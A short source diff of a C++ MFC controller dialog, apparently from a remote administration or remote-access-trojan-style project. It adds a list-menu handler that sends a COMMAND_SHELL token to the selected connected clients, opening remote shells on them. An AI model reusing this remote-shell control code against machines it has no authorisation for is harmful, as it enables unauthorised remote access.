@@ -71,6 +71,7 @@ BEGIN_MESSAGE_MAP(CPrincDlg, CDialogEx)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	ON_COMMAND(ID_LISTMENU_SHELL, &CPrincDlg::OnListmenuShell)
 END_MESSAGE_MAP()
 
 
@@ -393,6 +394,10 @@ LRESULT CPrincDlg::OnRemoveFromList(WPARAM wParam , LPARAM lParam)
 	AfxMessageBox(_T("aaaaaaaaa"));
 	return 0;
 }
+
+//////////////////////////////////////////////////////////////////////////
+// the next three functions was used for shell control
+//////////////////////////////////////////////////////////////////////////
 LRESULT CPrincDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext	*pContext = (ClientContext *)lParam;
@@ -416,4 +421,11 @@ void CPrincDlg::SendSelectCommand(PBYTE pData, UINT nSize)
 
 		//Save the pointer to the new item in our CList
 	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory	
+}
+
+void CPrincDlg::OnListmenuShell()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_SHELL;
+	SendSelectCommand(&bToken, sizeof(BYTE));	
 }
